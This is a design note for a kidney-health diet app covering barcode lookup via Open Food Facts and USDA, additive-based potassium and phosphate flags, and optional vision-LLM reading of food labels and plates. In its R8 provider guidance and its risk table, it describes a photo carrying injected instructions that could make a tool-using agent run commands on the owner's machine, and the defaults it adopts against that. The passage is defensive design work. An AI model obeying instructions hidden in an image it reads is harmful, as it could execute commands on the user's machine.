| **`barcode-detector` 3.2.2 + `zxing-wasm` 3.1.3 reader** | Yes | 44 KB JS + 1.09 MB WASM (lazy) | needs `'wasm-unsafe-eval'`; TT-safe with a static `<script>` | MIT + Apache-2.0 | **Chosen** |
| `zxing-wasm` 3.1.4 IIFE reader directly (`ZXingWASM.readBarcodes`) | Yes | ~38 KB JS + 954 KB WASM | same | same | Viable. No native-API parity, and it would diverge from note 02 |
| `@zxing/browser` 0.2.1 | Yes | 441 KB JS | fine | MIT/Apache | Fallback only |
| quagga2 1.12.1 | Yes | 157 KB | fine | MIT | No |

### 3.3 Where to decode

| Option | Works over HTTP | Data leaving the phone | Server attack surface | Image deps | Verdict |
|---|---|---|---|---|---|
| **Client (photo + live)** | Photo yes, live needs HTTPS | **Digits only** | none | none | **Chosen** |
| Server (`zxing-cpp` 3.1.1 Python, Apache-2.0, abi3 wheels for x86_64 and aarch64, + Pillow 12.3.0) | yes | the photo | decodes untrusted images in the app process | ~10 MB of wheels with C code | Not needed: WASM decode works on every supported browser. Keep as a documented option for API-only clients |

### 3.4 Photo of a nutrition label → numbers

| Option | AI? | Accuracy on real photos | Size / cost | CSP | Privacy | Verdict |
|---|---|---|---|---|---|---|
| **Photo beside the form** (manual typing with the zoomable photo next to the Quick add fields) | No | Exact (the person reads) | 0 | fine (`blob:` image) | never leaves the device | **v0.3 default** |
| Tesseract.js 7 + regex parser | No (classic OCR) | Unknown, layout-limited; must be measured | ~7 MB vendored | breaks TT (`Worker`, `importScripts`) | on device | **v0.4 experiment** behind a flag, with an accuracy gate |
| Server Tesseract | No | same as above | +tens of MB, C parsers | n/a | to server | No |
| **Vision LLM → JSON → prefill** | Yes (optional) | Best available; still review every field | local free / OpenAI < 1¢ | n/a | to the chosen provider | **v0.3 optional**, admin-enabled, per-user consent |
| Commercial label SDK (Passio) | Yes | good | $99+/mo | n/a | third party | No |

### 3.5 Photo of a plate

| Option | Accuracy | Safety | Verdict |
|---|---|---|---|
| None (search + portions by hand) | Person-dependent | Safe | Default |
| **Vision LLM names foods + guesses grams; nutrients come from the app's own database; the person confirms each item** | ~36 % MAPE on portions (F8) | Labelled estimate, never auto-saved, never for insulin dosing on its own | **v0.3 optional, off by default** |
| Vision LLM also outputs nutrient numbers | Unvalidated for K/P | Fabricated K/P numbers look authoritative | **Rejected** |

---

## 4. Recommendation

### R1. Behaviour in one paragraph

**Scan, photo or type** a barcode. The phone decodes it locally and sends **only the digits** to
our server. The server normalises and validates the GTIN and checks the local database: the user's
own foods first, then cached products. On a miss it asks **Open Food Facts API 3.4**, and then
**USDA FDC Branded** if a key is configured and OFF missed or lacks key fields. It maps the result
to a `Food` with per-serving nutrients, `null` for unknowns, flags from **additive tags and its own
ingredient scan**, and a quality list. It stores the food and returns it with attribution. The
existing entry sheet then shows the warnings before saving, as for any other food.

**If nothing is found:** the person types the label into Quick add with the photo beside the form,
or uses the optional AI label reader. Either way the new custom food **keeps the barcode**, so the
next scan finds it locally.

**Plate photos** are optional, AI-only, clearly labelled estimates that suggest foods from the
app's own database.

### R2. GTIN handling (`app/gtin.py`, pure functions)

```python
def normalize(code: str, fmt: str | None) -> str:
    """Return a GTIN-14 string or raise ValueError(reason).

    * Keep digits only; reject anything else, and lengths outside {8, 12, 13, 14}.
    * Length 8 and fmt == "upc_e": expand UPC-E to UPC-A (12 digits), then continue.
    * Length 8 otherwise: EAN-8. Length 12: UPC-A. 13: EAN-13. 14: GTIN-14.
    * Validate the GS1 mod-10 check digit (ValueError("check_digit")).
    * Zero-pad to 14.
    """

def classify(gtin14: str) -> str:   # "retail" | "restricted" | "isbn" | "issn" | "coupon"
    # Look at the GS1 prefix of the GTIN-13 (gtin14[1:]) or EAN-8.
    # restricted: 020-029, 040-049, 200-299; issn 977; isbn 978-979; coupon 050-059, 98x, 99x.

def off_code(gtin14: str) -> str:   # 13 digits, or 8 for EAN-8 (strip leading zeros, pad as OFF does)
def usda_candidates(gtin14: str) -> list[str]:  # [12-digit UPC-A if leading "00", 13-digit, 14-digit]
```

* The client sends `format` as reported (`ean_13`, `ean_8`, `upc_a`, `upc_e`, or `unknown` for
  typed digits).
* Tests cover the three shapes measured in F5 (`049000028911`, `0049000028911`, and UPC-E
  `01234565` / `0012345000065`). All must normalise to the same GTIN-14, or to `00012345000065`
  for the UPC-E case.
* Also test bad check digits and each special prefix.

### R3. Open Food Facts client (`app/off.py`)

* **Request**

  ```
  GET {OFF_BASE_URL}/api/v3.4/product/{off_code}?fields=code,product_name,product_name_en,generic_name,
      brands,quantity,serving_size,serving_quantity,serving_quantity_unit,nutrition_data_per,
      nutrition_data_prepared_per,no_nutrition_data,nutriments,ingredients_text,ingredients_text_en,
      additives_tags,categories_tags,countries_tags,nova_group,lang,last_modified_t
  User-Agent: KidneyHealth/<app version> (<OFF_CONTACT>)
  Accept: application/json
  ```

  * Use `httpx`, already a dependency: timeout 8 s, `follow_redirects=False`, and **response cap
    1 MB** (stream and abort).
  * `OFF_BASE_URL` defaults to `https://world.openfoodfacts.org`. It may point at
    `https://world.openfoodfacts.net` (staging) or a self-hosted Product Opener.
* **Pacing**
  * One **server-wide token bucket at 10 requests per minute** (`OFF_RATE_PER_MINUTE`, maximum 15).
  * A per-user cap of 60 lookups per hour.
  * When the bucket is empty, answer `429` with `Retry-After`. Never queue silently.
  * Retry once on 503 after 2 s. Never retry 404.
* **Cache** (table `barcode_cache`, R6)
  * Keep the trimmed upstream payload with `fetched_at`.
  * Found products are kept. **Refresh** happens only when the person taps "Refresh from Open Food
    Facts", at most once per GTIN per day.
  * `not_found` and `no_nutrition` are cached for **24 h** (`BARCODE_NEGATIVE_TTL_HOURS`).
  * Re-running a **newer mapping** over cached payloads needs no network (`python -m
    app.admin remap-barcodes`).
* **Mapping to the nutrient registry.** Read `_100g` for "as sold". Use `_prepared_100g` only when
  no as-sold values exist, and then add quality `prepared_values` and " (prepared)" to
  `serving_desc`.

  | App key | OFF field (per 100 g or 100 mL) | Conversion |
  |---|---|---|
  | `calories_kcal` | `energy-kcal_100g`; else `energy-kj_100g` (or `energy_100g`) ÷ 4.184 | |
  | `protein_g` | `proteins_100g` | |
  | `fat_g` / `sat_fat_g` | `fat_100g` / `saturated-fat_100g` | |
  | `carbs_g` | `carbohydrates-total_100g` if present, else `carbohydrates_100g` | Quality `carbs_available` when the product is not US/CA-labelled and only `carbohydrates` exists ("EU labels exclude fibre") |
  | `fiber_g` / `sugar_g` | `fiber_100g` / `sugars_100g` | |
  | `sodium_mg` | `sodium_100g` × 1000; else `salt_100g` × 1000 ÷ 2.5 | Quality `sodium_from_salt` |
  | `potassium_mg` | `potassium_100g` × 1000 | |
  | `phosphorus_mg` | `phosphorus_100g` × 1000 | |
  | `calcium_mg` | `calcium_100g` × 1000 | |
  | `fluid_ml` | the serving's mL when `counts_as_fluid`, else 0 | |

  * **Absent field → `null`.** Never 0.
  * **Serving**
    * When `serving_quantity` > 0 and the unit is `g` or `ml`: `serving_g = serving_quantity` (mL
      counted as grams, quality `ml_as_g`), and `serving_desc = serving_size` (trim to 60
      characters).
    * Otherwise use `serving_g = 100` and `serving_desc = "100 g"` / `"100 mL"`, with quality
      `no_serving`.
  * **Per-serving values:** when `nutrition_data_per == "serving"` and `<n>_serving` exists, use it
    directly (it is the label's own figure). Otherwise use `_100g × serving_g / 100`. Round as the
    contract says.
  * **Name:** `product_name` → `product_name_en` → `generic_name` → `"Product <code>"`. `brand` is
    the first entry of `brands`. Strip control characters and cap at 200 characters.
    `ingredients_text` (prefer `_en`) is capped at 4,000.
  * **Category:** first match in an ordered map of `categories_tags`:
    * `en:beverages` → Beverages;
    * `en:dairies` → Dairy & Alternatives;
    * `en:meats` and `en:eggs` → Meat, Poultry & Eggs;
    * `en:seafood` and `en:fishes` → Fish & Seafood;
    * `en:breads`, `en:breakfast-cereals` and `en:pastas` → Grains & Breads;
    * `en:legumes`, `en:nuts` and `en:seeds` → Legumes, Nuts & Seeds;
    * `en:fruits` → Fruits, `en:vegetables` → Vegetables;
    * `en:snacks`, `en:desserts` and `en:confectioneries` → Sweets & Snacks;
    * `en:condiments` and `en:sauces` → Condiments & Sauces;
    * `en:meals` and `en:pizzas` → Prepared & Fast Food;
    * otherwise `null`.

    Verify each tag against
    [`categories.json`](https://static.openfoodfacts.org/data/taxonomies/categories.json) when
    implementing.
  * **Flags:** see R5. Also:
    * `counts_as_fluid` when `serving_quantity_unit == "ml"`;
    * `processed` when `nova_group == 4`;
    * `high_gi` only for `en:sweetened-beverages` with ≥ 5 g sugars/100 mL (verify the tag);
    * **never** `hypo_treatment` or `low_potassium_fruit`.
* **Quality checks** (stored as `quality_json`, shown as notes in the sheet):
  * `potassium_unknown` and `phosphorus_unknown`;
  * `crowd_sourced`, always for OFF: "Community data. Check it against the package";
  * `energy_mismatch`: |kcal − (4·carbs + 4·protein + 9·fat)| > 25 % **and** > 40 kcal;
  * `implausible` (drop the value): sodium > 40 g/100 g unless the product is salt, potassium
    > 10 g/100 g, phosphorus > 5 g/100 g, or any nutrient above the model bounds;
  * `no_nutrition`, when `no_nutrition_data == "on"` or no energy/macros at all. Return the product
    name with a **404-style** "found but no nutrition facts" so the UI can offer Quick add with the
    name prefilled.
* **Second parser** `parse_nutrition_v35(product)` reads `nutrition.aggregated_set` (where `per`
  is `"100g"` or `"serving"`, and each nutrient has `{value, unit}`). Exercise it with a recorded
  v3.6 fixture so the API can be bumped by changing one constant (`OFF_API_VERSION = "3.4"`).

### R4. USDA FDC Branded by barcode (extend `app/foods.py`)

* Run only when a USDA key is available, and only if OFF returned `not_found` or `no_nutrition`,
  **or** OFF lacks potassium or sodium **and** the product is US-labelled.
* For each form in `usda_candidates(gtin14)`, call
  `GET /v1/foods/search?query=<form>&dataType=Branded&pageSize=10` with the `X-Api-Key` header. Pick
  the result whose `gtinUpc`, normalised, equals our GTIN-14. Stop at the first hit. That is at most
  3 calls.
* Then call `GET /v1/food/{fdcId}` and reuse `usda_record_to_food()`:
  * serving from `servingSize`/`servingSizeUnit` with `householdServingFullText`;
  * prefer `labelNutrients` per-serving values when present, accepting both `potassium` and
    `postassium`;
  * otherwise scale `foodNutrients` (per 100 g).
* **Merge rule** when both OFF and FDC hit:
  * nutrients come from **FDC** for US-labelled products (manufacturer data), and from **OFF**
    otherwise;
  * a `null` in the primary source may be filled from the other, with quality `filled_from_<src>`;
  * **flags are the union of both ingredient scans**.
* The food keeps `source = 'usda'` and `fdc_id` when FDC supplied the nutrients, otherwise
  `source = 'off'`.

### R5. Additives → flags (`app/additives.py`, pure, unit-tested)

```python
PHOSPHATE = {"e338","e339","e340","e341","e343","e450","e451","e452","e541","e542"}
PHOSPHATE_TRACE = {"e1410","e1412","e1413","e1414","e1442","e442"}
POTASSIUM_BULK = {"e326","e332","e261","e508","e501","e340","e351","e336","e337","e357",
                  "e577","e622","e525","e515","e402","e283","e450v","e451ii","e452ii"}
POTASSIUM_TRACE = {"e202","e212","e224","e228","e249","e252","e536","e555","e522","e628",
                   "e632","e950","e954iv"}

def scan(additives_tags: list[str], ingredients_text: str | None, name: str) -> AdditiveResult:
    """Return flags (phosphate_additive, potassium_additive, avoid_ckd), the E-codes and names
    found, and human-readable notes ('Contains potassium lactate (E326)')."""
```

* **Tags:** strip the `en:` prefix and lowercase. A tag matches its base code (`e451i` → `e451`),
  except the potassium sub-codes listed explicitly above.
* **Text** (lowercased, NFKC-normalised):
  * E-numbers via `\be[\s-]?(\d{3,4})\s*(\(?[a-z]{1,4}\)?)?`;
  * phosphate words via `(phosph|fosf)(at|or|it)`, excluding `phosphatid`, `phospholip`,
    `fosfolip`, `fosfatid`;
  * potassium words via `\b(mono|di|tri|tetra|penta)?(potassium|kalium|potasio|potassio|potássio)\b`
    **followed by** a bulk anion (chloride, lactate, citrate, acetate, diacetate, carbonate,
    bicarbonate, phosphate, pyrophosphate, polyphosphate, tripolyphosphate, malate, tartrate,
    gluconate, glutamate, hydroxide, sulfate/sulphate, alginate, propionate, adipate). Also match
    "cream of tartar" and "salt substitute".
  * Trace anions (sorbate, benzoate, metabisulfite, nitrite, nitrate, iodide, iodate,
    ferrocyanide) and "acesulfame" produce a **note only**.
* **`avoid_ckd`**:
  * when the **first** ingredient is potassium chloride / E508;
  * or when the name matches `salt substitute|lite salt|nosalt|nu-salt|half salt`.

  Use the same `kidney_notes` wording as the builtin salt-substitute entries.
* **New flag `potassium_additive`** (contract change: `FLAGS`, ARCHITECTURE.md, `app.js` parity
  code, `scripts/build_food_db.py` validation). Proposed warning rule in
  `nutrients.food_warnings()`:
  * potassium **known**: the level is the higher of the value's level and **`medium`**. Message:
    "Contains a potassium additive (potassium lactate, E326); additive potassium is about 90 %
    absorbed."
  * potassium **unknown (`null`)**: **`high`**. Message: "Potassium is not on the label, but it
    contains potassium chloride (E508). Processed meats with potassium additives measured
    750–1,100 mg per 100 g."
  * `hypo_treatment` foods keep this warning, as they keep the other mineral warnings.
  * Record the rule and its sources in `docs/research/fact-check.md` before shipping. The **owner
    and a renal dietitian decide** the `high`-when-unknown part.
* Phosphate keeps today's rule: `phosphate_additive` → high phosphorus.

### R6. Data model and API (contract changes for `ARCHITECTURE.md`)

**Migration** (new step in `app/db.py`, `ADD COLUMN` only):

```sql
ALTER TABLE foods ADD COLUMN gtin TEXT;                         -- GTIN-14, digits only
ALTER TABLE foods ADD COLUMN source_url TEXT;                   -- product page for attribution
ALTER TABLE foods ADD COLUMN source_license TEXT;               -- 'ODbL-1.0' | 'CC0-1.0' | NULL
ALTER TABLE foods ADD COLUMN retrieved_at TEXT;
ALTER TABLE foods ADD COLUMN ingredients_text TEXT;
ALTER TABLE foods ADD COLUMN additives_json TEXT NOT NULL DEFAULT '[]';  -- ["e326","e451"]: why a flag was set
ALTER TABLE foods ADD COLUMN quality_json TEXT NOT NULL DEFAULT '[]';    -- ["potassium_unknown", ...]
CREATE INDEX IF NOT EXISTS foods_gtin ON foods(gtin) WHERE gtin IS NOT NULL;
CREATE TABLE IF NOT EXISTS barcode_cache (
  gtin TEXT NOT NULL, provider TEXT NOT NULL,                   -- 'off' | 'usda'
  status TEXT NOT NULL,                                         -- 'found' | 'not_found' | 'no_nutrition'
  payload_json TEXT, fetched_at TEXT NOT NULL,
  PRIMARY KEY (gtin, provider)
);
```

* `FOOD_SOURCES` gains **`off`**. OFF and FDC-branded rows are **read-only** like builtin rows.
  Edits go through the existing `POST /api/foods/{id}/copy`, and the copy keeps `gtin`.
* `FoodCreate` and `POST /api/log/quick` accept an optional `gtin`, so a hand-entered product is
  found by its barcode next time.
* **Multi-user** (for the settings and multi-user note): product facts are not personal, but
  *which* products a person scans is.
  * Keep `barcode_cache` instance-wide.
  * Make `off` rows visible in a user's food search only after **that user** has scanned or logged
    them.
  * Lookup order: the user's own custom foods with that GTIN, then shared `off`/`usda` rows.

**Endpoints:**

* `POST /api/foods/barcode` takes `{"code": "049000028911", "format": "upc_a", "refresh": false}`.
  The body is POST rather than GET because a lookup may create a row, and so barcodes stay out of
  access logs.
  * `200` (cached) or `201` (new):

    ```json
    {"food": Food, "gtin": "00049000028911", "source": "off" | "usda" | "local",
     "attribution": {"text": "Product data © Open Food Facts contributors, ODbL",
                     "url": "https://world.openfoodfacts.org/product/0049000028911",
                     "license": "ODbL-1.0"},
     "quality": [{"code": "potassium_unknown", "message": "..."}]}
    ```
  * `400` `{"detail": "...", "reason": "check_digit" | "restricted" | "isbn" | "issn" | "coupon" | "format"}`
  * `404` `{"detail": "No product with this barcode in Open Food Facts or USDA", "gtin": "...", "name": null}`.
    With `no_nutrition`, `name` is filled.
  * `429` (local pacing, with `Retry-After`), `502` (upstream error or oversize), `503` (lookups
    disabled).
* `Food` gains the optional fields `gtin`, `source_url`, `source_license`, `quality`, `additives`
  and `ingredients_text`.
* The CSV export gains `source` and `source_license` columns. This is the ODbL notice for a
  Produced Work that leaves the app.

### R7. Frontend: scanning (`app/static/scan.js`, from note 02 R7, refined)

* **Vendored files**, with no CDN at runtime:

  ```
  app/static/vendor/barcode-detector-3.2.2/ponyfill.iife.js   # = dist/iife/ponyfill.js, 43,933 B
      sha256 e3aa2057178b8ea71dd97003270331bbcb46499197b68bc0c7dd18e40c0863ea
  app/static/vendor/barcode-detector-3.2.2/LICENSE             # MIT
  app/static/vendor/zxing-wasm-3.1.3/zxing_reader.wasm         # = dist/reader/zxing_reader.wasm, 1,093,289 B
      sha256 2ebda08a93eea3efcd8399cda6b276e6a0b1de4fec60b4d8988a047de4c6d1ba
  app/static/vendor/zxing-wasm-3.1.3/LICENSE                   # MIT
  app/static/vendor/zxing-wasm-3.1.3/LICENSE.zxing-cpp         # Apache-2.0 (ZXing-C++ commit a17fd9dc)
  app/static/vendor/README.md                                  # versions, upstream URLs, SHA-256, update steps
  ```

  * Serve `.wasm` as `application/wasm`. Starlette guesses this from the extension; assert it in a
    test.
  * Note 02 already lists these paths. This note adds the hashes and the static-load rule.
* **Loading.** Use a static `<script src="/vendor/barcode-detector-3.2.2/ponyfill.iife.js" defer>`
  in `index.html`, not script injection (Trusted Types, F5). On the first scan:

  ```js
  BarcodeDetectionAPI.prepareZXingModule({ overrides: { locateFile: (p, pre) =>
      p.endsWith('.wasm') ? '/vendor/zxing-wasm-3.1.3/' + p : pre + p } });
  ```

  Use the native `BarcodeDetector` when `getSupportedFormats()` includes `ean_13`. Formats:
  `['ean_13','ean_8','upc_a','upc_e']`.
* **Three entry points in the Add view**, all ending in `POST /api/foods/barcode`:
  1. **Scan**: live, shown only when `isSecureContext && navigator.mediaDevices?.getUserMedia`.
     Otherwise say "Live scanning needs HTTPS". Require two identical reads, throttle to about
     8 per second, and keep the WebKit 282327 timeout fallback from note 02.
  2. **Photo of barcode**: `<input type="file" accept="image/*">` → `createImageBitmap(file)` (fall
     back to `<img>` + canvas if it throws) → `detector.detect(bitmap)`. This works over **plain
     HTTP**. The photo never leaves the device.
  3. **Type barcode**: `inputmode="numeric"`, `autocomplete="off"`, submit on Enter. The check digit
     is validated in the client for instant feedback. This also serves USB/Bluetooth scanners and
     screen-reader users.
* **Result.**
  * On success, open the **existing entry sheet**: warnings, servings or grams, eaten/planned.
  * Show an attribution line under the food name with a link to the OFF product page. External
    links open in a new browsing context; that is user navigation, not a fetch.
  * Show quality notes in muted text. Show "Potassium: not listed" and "Phosphorus: not listed"
    explicitly in the numbers grid, instead of "—" or 0.
  * On `404`, offer **"Enter from the label"**: Quick add prefilled with the name and the GTIN, plus
    the photo-beside-form panel (R8). Also offer "Add it to Open Food Facts", a plain link to
    `https://world.openfoodfacts.org/cgi/product.pl?type=add&code=<code>` (verify the URL), for
    people who want to contribute back.
* **Preview build** (`scripts/build_preview.py`, `MockApi`): mock `POST /api/foods/barcode` from 3
  embedded fixture products. Do not ship the 1 MB WASM in the preview; "Type barcode" is enough
  there.

### R8. Photo of a nutrition label

**v0.3, no AI (always available): photo beside the form.**

* "Use a photo of the label" in Quick add opens the file input. Display it with
  `URL.createObjectURL(file)` in a zoomable `<img>` (pinch on touch, or a 1×/2×/3× toggle) placed
  above the fields on phones and beside them on wide screens.
* Nothing is uploaded. Revoke the object URL when the sheet closes.
* The fields are grouped as on the label: serving size, calories, fat, sodium, carbohydrate,
  fibre, sugars, protein, potassium, phosphorus, calcium.
* An **Ingredients** text box feeds the R5 scan on save, so typed "sodium phosphate" sets
  `phosphate_additive`.

**v0.3 optional, AI: "Read the label for me".** This shows only when the admin has enabled vision
**and** the user has opted in.

1. **Client:** `createImageBitmap` → canvas with long edge ≤ **1600 px** →
   `toBlob('image/jpeg', 0.85)`. This strips EXIF/GPS and handles HEIC.
2. Send `POST /api/vision/label` with `Content-Type: image/jpeg` and the JPEG bytes as the raw
   body.
   * The server reads the body with a streaming **cap of `MAX_IMAGE_BYTES` (default 4 MiB)**:
     `413` above the cap, `415` unless the magic bytes are `FF D8 FF`.
   * It **does not decode** the image and **never writes it to disk or logs**.
   * It base64-encodes the bytes into a `data:image/jpeg;base64,…` content part and calls the
     vision provider through the AI note's provider layer (OpenAI-compatible
     `/v1/chat/completions`), with `temperature: 0` and timeout `AI_VISION_TIMEOUT_S` (default
     120 s, because CPU-only Ollama is slow).
   * Send `response_format: {"type": "json_schema", "json_schema": {"name": "nutrition_label",
     "strict": true, "schema": …}}` when the provider supports it. **Always** re-validate with a
     strict Pydantic model (`extra="forbid"`, numeric bounds) whatever the provider claims.
3. **Schema.** Prompt: "Copy numbers exactly as printed; `null` if not printed or unreadable; do
   not estimate; do not convert % Daily Value to mg."

   ```json
   {"product_name": "string|null", "serving_size_text": "string|null", "serving_size_g": "number|null",
    "basis": "per_serving|per_100g|per_100ml",
    "nutrients": {"calories_kcal": "number|null", "protein_g": "…", "fat_g": "…", "sat_fat_g": "…",
                  "carbs_g": "…", "fiber_g": "…", "sugar_g": "…", "sodium_mg": "…",
                  "potassium_mg": "…", "phosphorus_mg": "…", "calcium_mg": "…"},
    "salt_g": "number|null", "ingredients_text": "string|null",
    "label_style": "us_nutrition_facts|eu_nutrition_declaration|other",
    "unreadable": ["field names"]}
   ```
4. **Server post-processing:**
   * scale `per_100g` to the serving when `serving_size_g` is known;
   * derive sodium from salt (÷ 2.5);
   * run the R5 additive scan on `ingredients_text`;
   * run the R3 quality checks (energy mismatch, implausible values).
5. The response is `{"draft": FoodCreate-shaped, "provider": "ollama:qwen3-vl:8b", "checks":
   [...], "notice": "Read by AI from your photo. Check every number against the label before
   saving."}`. It **never saves**.
6. The UI fills Quick add and **marks every AI-filled field** ("from photo", with a dotted
   underline). The Save button stays, and the photo stays visible beside the form for checking.

**Provider guidance** (defaults the AI note should adopt for vision):

* Local: `qwen3-vl:8b` (6.1 GB), `qwen3-vl:4b` (3.3 GB) for small boxes, `gemma4:12b-it-qat` as an
  alternative. All are Apache-2.0.
* OpenAI: `gpt-6-luna`.
* Keep the model a free-text setting. Do not hard-code it.
* Do not suggest `llama3.2-vision` as a default (EU clause).
* **Hermes Agent is not offered for photo features by default**, because the agent has terminal
  tools and a photo can carry injected instructions. An admin can override with
  `AI_VISION_ALLOW_AGENT=true`, after a warning that recommends a tool-less Hermes profile.

**v0.4 experiment: on-device OCR with Tesseract.js 7.0.0.**

* Ship it only if it passes an accuracy gate: on **≥ 30 real label photos**, an exact match for
  calories, carbohydrate, sodium and potassium in **≥ 95 %** of fields present. The corpus can come
  from OFF nutrition-table images (CC BY-SA), downloaded by a dev script and not committed. Their
  OFF values serve as noisy ground truth, checked by hand.
* It also needs a named Trusted Types policy (`trusted-types kh-ocr`) that allows only
  `/vendor/tesseract-7.0.0/` URLs, plus a CSP variant on that worker script.
* Vendored at about 7 MB, so it must be lazy-loaded and cached by the service worker.

### R9. Photo of a plate (optional, AI only, off by default)

* Use the same upload path as R8: `POST /api/vision/plate`.
* Schema:

  ```json
  {"items": [{"name": "white rice", "portion_text": "about 1 cup",
              "grams_estimate": 150, "confidence": "low|medium|high"}],
   "notes": "string|null"}
  ```

  At most 8 items. Names are capped at 80 characters.
* For each item the server runs the **existing local food search** (`GET /api/foods?q=`) and
  returns up to **3 candidate foods from the app's own database**, with `servings` derived from
  `grams_estimate / serving_g`. **The model never supplies nutrient values.**
* The UI shows a checklist: each item has a candidate picker, an editable amount and a
  "not this" option. It adds the chosen items as **planned** by default, with "Eaten" one tap away.
* Fixed banner: "AI estimate from a photo. In studies, portion estimates were off by about a third
  and too small for big plates. Weigh or measure when it matters, and do not dose insulin from this
  alone."
* `confidence: low` items start unticked.

### R10. Settings and configuration

These follow note 01's conventions: env vars, `<KEY>_FILE` for secrets, keys write-only. The
settings note decides the UI.

| Key (env) | Scope | Default | Purpose |
|---|---|---|---|
| `OFF_ENABLED` | admin | **false** | Barcode lookups contact Open Food Facts. Off by default, which keeps the README promise of no external requests unless enabled. The setup wizard asks |
| `OFF_BASE_URL` | admin | `https://world.openfoodfacts.org` | Staging or a self-hosted Product Opener |
| `OFF_CONTACT` | admin | `https://github.com/ksullivan86/kidney-health` | Goes in the User-Agent. An admin email is better, as OFF asks |
| `OFF_RATE_PER_MINUTE` | admin | 10 (max 15) | Server-wide token bucket |
| `BARCODE_NEGATIVE_TTL_HOURS` | admin | 24 | |
| `USDA_API_KEY[_FILE]` | admin-shared | unset | Existing key. Also enables branded barcode fallback (`USDA_BRANDED_BARCODE`, default true) |
| user `usda_api_key` | user-private | unset | Overrides the shared key for that user's lookups (encrypted, write-only) |
| `AI_VISION_ENABLED` | admin | **false** | Master switch for R8 AI and R9 |
| `AI_VISION_PLATE_ENABLED` | admin | false | R9 separately |
| `AI_VISION_ALLOW_AGENT` | admin | false | Allows a tool-using agent endpoint for photos |
| `AI_VISION_TIMEOUT_S` | admin | 120 | |
| `MAX_IMAGE_BYTES` | admin | 4194304 | Per-route cap for every photo route. Note 01 now uses this key too; its multipart `MAX_UPLOAD_BYTES` was dropped (security review) |
| user "Send my photos to <provider>" | user | off | Per-provider consent, with the provider's retention line from F7 |
| user "Prefer live camera" | user | on (HTTPS only) | |

Provider, model, base URL and key for vision come from the AI note's provider settings
(admin-shared or user-private). This note only requires that the provider be OpenAI-compatible,
accept `data:` images, and report whether it supports `json_schema`.

**Network allowlist.** Add `world.openfoodfacts.org` to the runtime egress in
`docs/network-allowlist.md`, in the Kubernetes NetworkPolicy/Cilium FQDN rules (note 01), and in
the docs for the optional features. `images.openfoodfacts.org` is **not** needed: the app shows no
product images.

### R11. Attribution and licences in the product

* **Food sheet**, for `source == 'off'`: "Product data © Open Food Facts contributors (ODbL)",
  linking to the product page.
* **About / Settings → Data sources**:
  * "Contains information from [Open Food Facts](https://world.openfoodfacts.org), which is made
    available here under the [Open Database License (ODbL)](https://opendatacommons.org/licenses/odbl/1-0/)."
  * "How this app changes that data: [`app/off.py`](…/app/off.py)". This is the ODbL §4.6 method
    file.
  * The USDA FDC citation.
  * The licences of ZXing-C++ (Apache-2.0), `zxing-wasm` and `barcode-detector` (MIT).
* **Never commit OFF data** to the repository or the image, beyond a few single-product **test
  fixtures** (insubstantial extracts) with an attribution README. This keeps PolyForm-licensed code
  and ODbL data separate.

### R12. File layout (new or changed)

```
app/gtin.py                 normalize(), classify(), off_code(), usda_candidates()      (pure)
app/additives.py            E-number tiers, ingredient scan, flags + notes              (pure)
app/off.py                  OFF client (v3.4), pacing, cache, mapping, quality checks, v3.5+ parser
app/barcode.py              router: POST /api/foods/barcode; provider chain; FDC branded matching
app/vision.py               router: POST /api/vision/label, /api/vision/plate; raw-body cap; schemas
app/foods.py                + gtin/source fields in insert/serialize; branded helpers reuse usda mapping
app/nutrients.py            FOOD_SOURCES += "off"; FLAGS += "potassium_additive"; warning rule
app/models.py               BarcodeLookup, BarcodeResult, LabelDraft, PlateEstimate; Food optional fields
app/db.py                   migration step (columns, index, barcode_cache)
app/static/scan.js          decoder selection, photo/live/typed entry, result handling
app/static/vendor/...       per R7 (+ vendor/README.md with hashes)
app/static/index.html       static <script defer> for the ponyfill; scan/photo buttons
tests/fixtures/off/*.json   recorded OFF v3.4 + v3.6 responses (Diet Coke, Kraft mac & cheese,
                            Lay's, Nutella, a 404), with fixtures/off/README.md (ODbL attribution)
tests/fixtures/usda/*.json  recorded FDC branded search + food records
tests/test_gtin.py, tests/test_additives.py, tests/test_off_mapping.py,
tests/test_barcode_api.py, tests/test_vision_api.py (provider mocked; no network)
docs/barcode-and-photos.md  user guide: what leaves your device, HTTPS for live scanning,
                            "unknown" potassium, how to contribute to OFF
docs/network-allowlist.md   + world.openfoodfacts.org (runtime, optional)
ARCHITECTURE.md             contract changes from R5/R6
```

No new Python dependency. `httpx` and Pydantic are enough, and the server does no image work.

---

## 5. Risks

| Risk | Likelihood | Impact | Mitigation |
|---|---|---|---|
| OFF data wrong (crowd-sourced) | Medium | Wrong K/Na/carbs in a log | Quality checks (energy mismatch, implausible values); "check against the package" note; FDC preferred for US products; read-only rows plus "copy and edit"; refresh button |
| **Potassium/phosphorus unknown** for most products (F1 table) | Certain | False sense of safety | Show "not listed" explicitly; additive flags; `high` when an additive is present and the value is unknown (owner decision); the diet guide's label advice linked from the sheet |
| OFF changes the schema again (3.5 already emptied `nutriments`) | High over 1–2 years | Lookups return no nutrients | Pin `v3.4`; a fixture test that fails if `nutriments` is empty; second parser ready; re-verify every 6 months |
| OFF rate limit or IP ban on a shared instance | Low for a household, higher for a public instance | Lookups fail | Server-wide 10/min bucket, positive and negative cache, per-user cap; docs advise big instances to use the dump or their own Product Opener |
| FDC GTIN search misses products (my test: 0 hits) | Medium | Fallback adds little | Exact-match check on `gtinUpc`; 3 forms tried; documented as best effort |
| Restricted-circulation codes hit the wrong product | Medium for deli/produce | Wrong food logged | `classify()` refuses 02x/04x/2xx before any lookup |
| `potassium_additive` over-warns (e.g. a tiny E508 dose) | Medium | Alert fatigue | Bulk and trace tiers; `medium` when the value is known; tunable after dietitian review |
| WASM decoder blocked by CSP/TT | Medium if notes are not reconciled | No scanning on iOS | `'wasm-unsafe-eval'` in `script-src`; static `<script>`; a test asserts the CSP string and that `vendor/` hashes match `vendor/README.md` |
| Live camera broken in iOS Home Screen apps (WebKit 282327) | Medium | Scan button fails | Photo and typed entry always present; 4 s no-frame fallback (note 02) |
| AI label read hallucinates a number | Medium | Wrong log, possibly an insulin error | Strict schema, "copy exactly, null if unsure", validation, every field marked "from photo", never auto-save |
| Plate estimates trusted for insulin | Medium | Hypo or hyper | Off by default; banner; model never supplies nutrients; low-confidence items unticked |
| Photos leak (GPS, retention at the provider) | Low to medium | Privacy | Canvas re-encode; no disk, no logs; per-provider consent with the retention line; local Ollama recommended |
| Prompt injection via photo into a tool-using agent | Low but severe | Command execution on the owner's machine | Agents excluded by default (`AI_VISION_ALLOW_AGENT`); no tools in vision calls; outputs only parsed as JSON |
